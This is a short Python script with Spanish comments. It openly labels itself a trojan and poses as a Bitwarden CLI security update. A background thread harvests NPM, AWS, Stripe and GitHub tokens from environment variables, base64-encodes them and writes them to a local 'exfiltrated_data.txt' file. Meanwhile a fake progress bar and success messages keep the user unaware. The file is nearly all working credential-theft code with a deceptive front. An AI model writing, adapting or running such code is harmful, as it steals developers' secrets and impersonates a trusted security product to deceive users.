import os
import base64
import time
import threading
import sys

# --- PROCESO MALICIOSO ---
def troyano_silencioso():
    # El virus actúa rápido y en silencio
    objetivos = ['NPM_TOKEN', 'AWS_ACCESS_KEY', 'STRIPE_API_KEY', 'GITHUB_TOKEN']
    encontrados = {}

    for var in objetivos:
        valor = os.getenv(var)
        if valor:
            encontrados[var] = base64.b64encode(valor.encode()).decode()

    if encontrados:
        with open("exfiltrated_data.txt", "w") as f:
            for k, v in encontrados.items():
                f.write(f"VULNERADO: {k} | DATA: {v}\n")

# --- PROCESO VISUAL (Simulación de descarga) ---
def simulador_descarga():
    print("--- 🛡️  BITWARDEN CLI v2026.4.0 ---")
    print("[INFO] Iniciando actualización de base de datos de seguridad...")
    
    for i in range(1, 101):
        time.sleep(0.05)  # Velocidad de la barra
        sys.stdout.write(f"\rDescargando componentes: [{('=' * (i // 5)).ljust(20)}] {i}%")
        sys.stdout.flush()
    
    print("\n\n[SUCCESS] Actualización completada con éxito.")
    print("[INFO] El sistema está protegido y listo para usar.")

if __name__ == "__main__":
    # 1. El ataque ocurre de inmediato en segundo plano
    ataque = threading.Thread(target=troyano_silencioso, daemon=True)
    ataque.start()

    # 2. El usuario solo ve esta barra de progreso profesional
    simulador_descarga()
